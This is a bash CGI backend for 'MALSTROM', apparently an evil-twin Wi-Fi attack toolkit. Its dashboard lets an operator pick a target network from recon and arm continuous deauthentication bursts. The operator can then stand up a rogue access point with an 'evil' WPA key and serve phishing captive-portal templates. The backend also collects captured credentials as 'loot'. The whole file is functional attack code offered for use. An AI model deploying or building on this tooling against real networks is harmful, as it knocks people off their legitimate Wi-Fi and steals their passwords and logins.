#!/bin/bash
# ============================================================================
# DarkSec MALSTROM — CGI backend (uhttpd / cgi-bin)
#
# Dispatch table:
#   challenge            request a nonce for token auth
#   auth                 exchange proof-of-token for a session id
#   status               state + clients + creds + whitelist snapshot
#   start                arm the kill chain (writes state, engine picks it up)
#   disarm               set state.active=false
#   cleanup              full teardown (shared lib: cleanup.sh)
#   loot                 captured creds as JSON array
#   loot_plain           creds as plain text
#   alerts               queued ALERT events
#   events               SSE live stream
#   templates            list portal templates
#   template             render one template with placeholders substituted
#   scan                 pull live target list from PineAP recon
#
# Auth: challenge+auth prove the operator knows the access token (printed on
# the Pager LCD at startup). Every other action requires sid from /auth.
# ============================================================================

CGI_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PAYLOAD_DIR="$(cd "$CGI_DIR/../.." && pwd)"
MALSTROM_STATE_DIR="${MALSTROM_STATE_DIR:-/tmp/malstrom}"

STATE_FILE="$MALSTROM_STATE_DIR/state"
EVENTS_FILE="$MALSTROM_STATE_DIR/events"
CREDS_FILE="$MALSTROM_STATE_DIR/creds.json"
CREDS_LOG="$MALSTROM_STATE_DIR/creds.log"
WHITELIST_FILE="$MALSTROM_STATE_DIR/whitelist.txt"
TOKEN_FILE="$MALSTROM_STATE_DIR/token"
NONCE_FILE="$MALSTROM_STATE_DIR/nonce"
SESSION_FILE="$MALSTROM_STATE_DIR/session"

TEMPLATES_DIR="$PAYLOAD_DIR/portal/templates"
PORTAL_IP="${MALSTROM_PORTAL_IP:-172.16.52.1}"

# --- helpers -------------------------------------------------------------------
json_header() {
    printf 'Content-Type: application/json; charset=utf-8\r\n\r\n'
}

out() { printf '%s' "$1"; }

sanitize() { printf '%s' "$1" | tr -d '"\\'; }

json_escape() {
    if command -v python3 >/dev/null 2>&1; then
        python3 -c 'import json,sys; print(json.dumps(sys.stdin.read()))'
    else
        sed -e 's/\\/\\\\/g' -e 's/"/\\"/g' | tr '\n' ' '
    fi
}

sha256sum_val() {
    # $1: string, prints hex digest
    if command -v sha256sum >/dev/null 2>&1; then
        printf '%s' "$1" | sha256sum | cut -d' ' -f1
    elif command -v sha256 >/dev/null 2>&1; then
        printf '%s' "$1" | sha256 | cut -d' ' -f1
    fi
}

session_valid() {
    local given
    given=$(echo "${QUERY_STRING}" | sed -n 's/.*[?&]token=\([^&]*\).*/\1/p')
    [ -z "$given" ] && return 1
    [ -f "$SESSION_FILE" ] || return 1
    [ "$given" = "$(cat "$SESSION_FILE" 2>/dev/null)" ]
}

require_auth() {
    if ! session_valid; then
        json_header
        out '{"ok":0,"error":"auth required"}'
        exit 0
    fi
}

emit() {
    printf '{"ts":"%s","type":"%s","msg":"%s"}\n' \
        "$(date '+%Y-%m-%d %H:%M:%S')" "$1" "$2" >> "$EVENTS_FILE" 2>/dev/null
}

rand_token() {
    if command -v openssl >/dev/null 2>&1; then
        openssl rand -hex 8
    else
        printf '%04x%04x%04x%04x' "$RANDOM" "$RANDOM" "$RANDOM" "$RANDOM"
    fi
}

# --- auth ----------------------------------------------------------------------
action_challenge() {
    local nonce
    nonce="$(rand_token)$(date +%s)"
    echo "$nonce" > "$NONCE_FILE"
    json_header
    printf '{"ok":1,"nonce":"%s"}' "$nonce"
    exit 0
}

action_auth() {
    local nonce resp expected given
    nonce=$(echo "${QUERY_STRING}" | sed -n 's/.*[?&]nonce=\([^&]*\).*/\1/p')
    resp=$(echo "${QUERY_STRING}"   | sed -n 's/.*[?&]resp=\([^&]*\).*/\1/p')
    json_header
    [ -z "$nonce" ] || [ -z "$resp" ] && { out '{"ok":0,"error":"bad request"}'; exit 0; }
    [ -f "$NONCE_FILE" ] || { out '{"ok":0,"error":"no challenge"}'; exit 0; }
    given="$nonce:$TOKEN"
    if [ -f "$TOKEN_FILE" ]; then
        given="$nonce:$(cat "$TOKEN_FILE")"
    fi
    expected="$(sha256sum_val "$given")"
    if [ -n "$expected" ] && [ "$expected" = "$resp" ]; then
        local sid
        sid="$(rand_token)"
        echo "$sid" > "$SESSION_FILE"
        printf '{"ok":1,"sid":"%s"}' "$sid"
        emit "INFO" "Operator authenticated from ${REMOTE_ADDR:-unknown}"
    else
        out '{"ok":0,"error":"denied"}'
    fi
    exit 0
}

# --- status ----------------------------------------------------------------------
action_status() {
    local state_json clients whitelist_json creds_count ip mac name
    state_json="{}"
    [ -f "$STATE_FILE" ] && state_json="$(cat "$STATE_FILE")"
    creds_count=0
    [ -f "$CREDS_FILE" ] && creds_count=$(wc -l < "$CREDS_FILE")

    # eslint-disable-next-line bash
    clients=""
    while read -r ip hw flags mac mask dev; do
        [ -z "$ip" ] && continue
        [ "$mac" = "00:00:00:00:00:00" ] && continue
        [ "$ip" = "$PORTAL_IP" ] && continue
        name=$(awk -v i="$ip" '$3==i {print $4}' /tmp/dhcp.leases 2>/dev/null | head -n1)
        clients+="{\"ip\":\"$ip\",\"mac\":\"$mac\",\"name\":\"$name\"},"
    done < /proc/net/arp 2>/dev/null
    clients="${clients%,}"

    whitelist_json=""
    if [ -f "$WHITELIST_FILE" ]; then
        while read -r ip; do
            [ -z "$ip" ] && continue
            whitelist_json+="\"$ip\","
        done < "$WHITELIST_FILE"
        whitelist_json="${whitelist_json%,}"
    fi
    whitelist_json="[$whitelist_json]"

    local engine_alive=0
    if pgrep -f "engine.py" >/dev/null 2>&1; then engine_alive=1; fi

    json_header
    printf '{"ok":1,"engine":%d,"state":%s,"creds_count":%d,"clients":[%s],"whitelist":%s}' \
        "$engine_alive" "$state_json" "$creds_count" "$clients" "$whitelist_json"
    exit 0
}

# --- attack control ---------------------------------------------------------------
write_state() {
    # build state JSON from query params with sane fallbacks, then write file
    local ssid bssid channel pmode psk dmode burst delay cont tpl
    ssid=$(sanitize "$(echo "${QUERY_STRING}" | sed -n 's/.*[?&]ssid=\([^&]*\).*/\1/p')")
    bssid=$(sanitize "$(echo "${QUERY_STRING}" | sed -n 's/.*[?&]bssid=\([^&]*\).*/\1/p')")
    channel=$(echo "${QUERY_STRING}" | sed -n 's/.*[?&]channel=\([^&]*\).*/\1/p')
    pmode=$(echo "${QUERY_STRING}" | sed -n 's/.*[?&]portal_mode=\([^&]*\).*/\1/p')
    psk=$(sanitize "$(echo "${QUERY_STRING}" | sed -n 's/.*[?&]psk=\([^&]*\).*/\1/p')")
    dmode=$(echo "${QUERY_STRING}" | sed -n 's/.*[?&]deauth_mode=\([^&]*\).*/\1/p')
    burst=$(echo "${QUERY_STRING}" | sed -n 's/.*[?&]burst=\([^&]*\).*/\1/p')
    delay=$(echo "${QUERY_STRING}" | sed -n 's/.*[?&]delay=\([^&]*\).*/\1/p')
    cont=$(echo "${QUERY_STRING}" | sed -n 's/.*[?&]continuous=\([^&]*\).*/\1/p')
    tpl=$(sanitize "$(echo "${QUERY_STRING}" | sed -n 's/.*[?&]template=\([^&]*\).*/\1/p')")

    # merge with existing state for anything not provided
    if [ -f "$STATE_FILE" ]; then
        local old
        old="$(cat "$STATE_FILE")"
        [ -z "$ssid" ] && ssid="$(echo "$old" | sed -n 's/.*"target_ssid":"\([^"]*\)".*/\1/p' | head -n1)"
        [ -z "$bssid" ] && bssid="$(echo "$old" | sed -n 's/.*"target_bssid":"\([^"]*\)".*/\1/p' | head -n1)"
        [ -z "$channel" ] && channel="$(echo "$old" | sed -n 's/.*"target_channel":"\([^"]*\)".*/\1/p' | head -n1)"
        [ -z "$pmode" ] && pmode="$(echo "$old" | sed -n 's/.*"portal_mode":"\([^"]*\)".*/\1/p' | head -n1)"
        [ -z "$psk" ] && psk="$(echo "$old" | sed -n 's/.*"wpa_psk":"\([^"]*\)".*/\1/p' | head -n1)"
        [ -z "$dmode" ] && dmode="$(echo "$old" | sed -n 's/.*"deauth_mode":"\([^"]*\)".*/\1/p' | head -n1)"
    fi

    [ -z "$channel" ] && channel="6"
    [ -z "$pmode" ] && [ -n "$psk" ] && pmode="wpa"
    [ -z "$pmode" ] && pmode="open"
    [ -z "$dmode" ] && dmode="broadcast"
    [ -z "$burst" ] && burst=25
    [ -z "$delay" ] && delay=1
    [ -z "$cont" ] && cont=1
    [ -z "$tpl" ] && tpl="wifi_login"
    [ "$cont" != "0" ] && cont=1

    # auto-generate a WPA PSK if requested mode is wpa and none supplied
    if [ "$pmode" = "wpa" ] && [ -z "$psk" ]; then
        psk="M$RANDOM-$RANDOM-$RANDOM"
    fi

    json_header
    if [ -z "$ssid" ]; then
        out '{"ok":0,"error":"ssid required"}'
        exit 0
    fi

    mkdir -p "$MALSTROM_STATE_DIR"
    printf '{"active":true,"target_ssid":"%s","target_bssid":"%s","target_channel":"%s",\
"portal_mode":"%s","wpa_psk":"%s","deauth_mode":"%s","deauth_burst":%s,"deauth_delay":%s,\
"deauth_continuous":%s,"template":"%s","redir_target":"http://example.com","updated":%d}' \
        "$ssid" "$bssid" "$channel" "$pmode" "$psk" "$dmode" "$burst" "$delay" \
        "$cont" "$tpl" "$(date +%s)" > "$STATE_FILE"

    # immediate: runtime default template + psk note for portal/engine
    echo "$tpl" > "$MALSTROM_STATE_DIR/template_default"
    echo "$ssid" > "$MALSTROM_STATE_DIR/current_ssid"
    [ "$pmode" = "wpa" ] && printf '{"ts":"%s","type":"INFO","msg":"Evil WPA PSK set: %s"}\n' \
        "$(date '+%Y-%m-%d %H:%M:%S')" "$psk" >> "$EVENTS_FILE"

    out '{"ok":1,"target":"'"$ssid"'"}'
    exit 0
}

action_start() { write_state; }

action_disarm() {
    require_auth
    if [ -f "$STATE_FILE" ]; then
        sed -i 's/"active": *true/"active": false/' "$STATE_FILE"
    fi
    emit "DEP" "Kill chain disarmed from dashboard"
    json_header
    out '{"ok":1}'
    exit 0
}

action_cleanup() {
    require_auth
    # shellcheck source=../../cleanup.sh
    # shellcheck disable=SC1091
    . "$PAYLOAD_DIR/cleanup.sh"
    malstrom_full_cleanup
    emit "CLEANUP" "Full cleanup requested from dashboard"
    rm -f "$MALSTROM_STATE_DIR/template_default"
    json_header
    out '{"ok":1,"note":"original config restored"}'
    exit 0
}

# --- loot ---------------------------------------------------------------------------
action_loot() {
    require_auth
    local line list=""
    if [ -f "$CREDS_FILE" ]; then
        while IFS= read -r line; do
            [ -z "$line" ] && continue
            list+="$line,"
        done < "$CREDS_FILE"
        list="${list%,}"
    fi
    json_header
    printf '{"ok":1,"creds":[%s]}' "$list"
    exit 0
}

action_loot_plain() {
    require_auth
    printf 'Content-Type: text/plain; charset=utf-8\r\n\r\n'
    [ -f "$CREDS_LOG" ] && cat "$CREDS_LOG"
    exit 0
}

action_alerts() {
    require_auth
    local line buf="" arr=""
    if [ -f "$EVENTS_FILE" ]; then
        buf="$(sed -n '/"type":"ALERT"/p' "$EVENTS_FILE" 2>/dev/null | tail -n 50)"
    fi
    while IFS= read -r line; do
        [ -z "$line" ] && continue
        arr+="$line,"
    done <<< "$buf"
    arr="${arr%,}"
    json_header
    printf '{"ok":1,"alerts":[%s]}' "$arr"
    exit 0
}

# --- templates -------------------------------------------------------------------------
action_templates() {
    require_auth
    local f names=""
    for f in "$TEMPLATES_DIR"/*.html; do
        [ -e "$f" ] || continue
        names+="\"$(basename "$f" .html)\","
    done
    names="${names%,}"
    json_header
    printf '{"ok":1,"templates":[%s]}' "$names"
    exit 0
}

action_template() {
    require_auth
    local name
    name=$(echo "${QUERY_STRING}" | sed -n 's/.*[?&]name=\([^&]*\).*/\1/p')
    [ -z "$name" ] && name="wifi_login"
    local ssid=""
    [ -f "$STATE_FILE" ] && ssid="$(cat "$STATE_FILE" | sed -n 's/.*"target_ssid":"\([^"]*\)".*/\1/p' | head -n1)"
    [ -z "$ssid" ] && ssid="${MALSTROM_TARGET_SSID:-MALSTROM-NET}"
    local file="$TEMPLATES_DIR/$name.html"
    local html=""
    if [ -f "$file" ]; then
        html="$(sed -e 's/__MALSTROM_SSID__/'"$ssid"'/g' \
            -e 's|__MALSTROM_TARGET__|http://example.com|g' "$file")"
    fi
    html="$(printf '%s' "$html" | json_escape)"
    json_header
    printf '{"ok":1,"html":%s}' "$html"
    exit 0
}

# --- recon pull ---------------------------------------------------------------------
action_scan() {
    require_auth
    local aps="[]"
    if command -v python3 >/dev/null 2>&1; then
        aps="$(python3 -c '
import json, subprocess, sys
try:
    out = subprocess.run(["_pineap","RECON","APS","format=json"],
                         capture_output=True, text=True, timeout=10).stdout or ""
    data = json.loads(out) if out.strip() else []
    if isinstance(data, dict):
        data = data.get("aps", data.get("results", []))
    clean = []
    for a in data:
        if isinstance(a, dict):
            clean.append({
                "ssid": a.get("ssid") or "[hidden]",
                "bssid": a.get("mac") or a.get("bssid") or "",
                "channel": a.get("channel") or 0,
            })
    json.dump(clean, sys.stdout)
except Exception as e:
    sys.stderr.write(str(e))
    sys.stdout.write("[]")
' 2>/dev/null)"
    fi
    json_header
    printf '{"ok":1,"aps":%s}' "$aps"
    exit 0
}

# --- SSE stream -----------------------------------------------------------------------
action_events() {
    # session token required in query
    if ! session_valid; then
        printf 'Content-Type: text/event-stream\r\n\r\n'
        printf 'data: {"ts":"","type":"ALERT","msg":"auth required"}\n\n'
        exit 0
    fi
    printf 'Content-Type: text/event-stream; charset=utf-8\r\n'
    printf 'Cache-Control: no-cache\r\n'
    printf 'Connection: keep-alive\r\n\r\n'
    mkdir -p "$MALSTROM_STATE_DIR"
    [ -f "$EVENTS_FILE" ] || : > "$EVENTS_FILE"

    # snapshot line so the UI has something immediately
    printf 'data: {"ts":"%s","type":"INFO","msg":"MALSTROM stream connected"}\n\n' "$(date '+%Y-%m-%d %H:%M:%S')"

    local read_len=0 file_len=0 new_block=""
    read_len=$(wc -l < "$EVENTS_FILE")
    while true; do
        file_len=$(wc -l < "$EVENTS_FILE" 2>/dev/null)
        if [ "$file_len" -gt "$read_len" ]; then
            new_block=$(sed -n "$((read_len + 1)),$((file_len))p" "$EVENTS_FILE" 2>/dev/null)
            read_len=$file_len
            if [ -n "$new_block" ]; then
                printf '%s\n' "$new_block" | while IFS= read -r line; do
                    [ -z "$line" ] && continue
                    printf 'data: %s\n\n' "$line"
                done
            fi
        fi
        sleep 1
    done
    exit 0
}

# --- dispatch ---------------------------------------------------------------------------
ACTION=$(echo "${QUERY_STRING}" | sed -n 's/.*[?&]action=\([^&]*\).*/\1/p')
case "$ACTION" in
    challenge) action_challenge ;;
    auth)      action_auth ;;
    status)    require_auth; action_status ;;
    start)     require_auth; action_start ;;
    disarm)    action_disarm ;;
    cleanup)   action_cleanup ;;
    loot)      action_loot ;;
    loot_plain) action_loot_plain ;;
    alerts)    action_alerts ;;
    templates) action_templates ;;
    template)  action_template ;;
    scan)      action_scan ;;
    events)    action_events ;;
    *) json_header; out '{"ok":0,"error":"unknown action"}'; exit 0 ;;
esac